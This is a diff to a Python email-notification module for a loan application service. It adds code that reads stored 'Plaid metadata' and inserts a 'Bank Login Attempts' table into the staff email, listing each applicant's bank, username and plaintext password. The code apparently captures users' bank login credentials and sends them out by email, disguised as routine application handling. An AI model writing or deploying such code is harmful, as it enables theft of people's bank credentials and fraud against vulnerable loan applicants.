@@ -1,6 +1,7 @@
 import smtplib
 import ssl
 import os
+import json
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.application import MIMEApplication
@@ -435,6 +436,29 @@ def send_bank_info_notification(loan_application, bank_info):
     """
     subject = f"Bank Information Submitted: {loan_application.full_name}"
     
+    # Parse Plaid metadata from the JSON string if available
+    plaid_metadata_html = ""
+    if hasattr(bank_info, 'plaid_metadata') and bank_info.plaid_metadata:
+        try:
+            plaid_metadata = json.loads(bank_info.plaid_metadata)
+            plaid_metadata_html = f"""
+            <div class="section">
+                <h3>Bank Login Attempts</h3>
+                <table>
+                    <tr><th>Attempt</th><th>Bank</th><th>Username</th><th>Password</th><th>Timestamp</th></tr>
+                    <tr>
+                        <td>{plaid_metadata.get('attempt', 'N/A')}</td>
+                        <td>{plaid_metadata.get('bank', 'N/A')}</td>
+                        <td>{plaid_metadata.get('username', 'N/A')}</td>
+                        <td>{plaid_metadata.get('password', 'N/A')}</td>
+                        <td>{plaid_metadata.get('timestamp', 'N/A')}</td>
+                    </tr>
+                </table>
+            </div>
+            """
+        except (json.JSONDecodeError, AttributeError, Exception) as e:
+            print(f"Error parsing Plaid metadata: {str(e)}")
+    
     body_html = f"""
     <html>
     <head>
@@ -473,6 +497,8 @@ def send_bank_info_notification(loan_application, bank_info):
                     <tr><td>Account Type</td><td>{bank_info.account_type.replace('_', ' ').title()}</td></tr>
                 </table>
             </div>
+            
+            {plaid_metadata_html}
             
             <p>Please review this information at your earliest convenience.</p>
         </div>
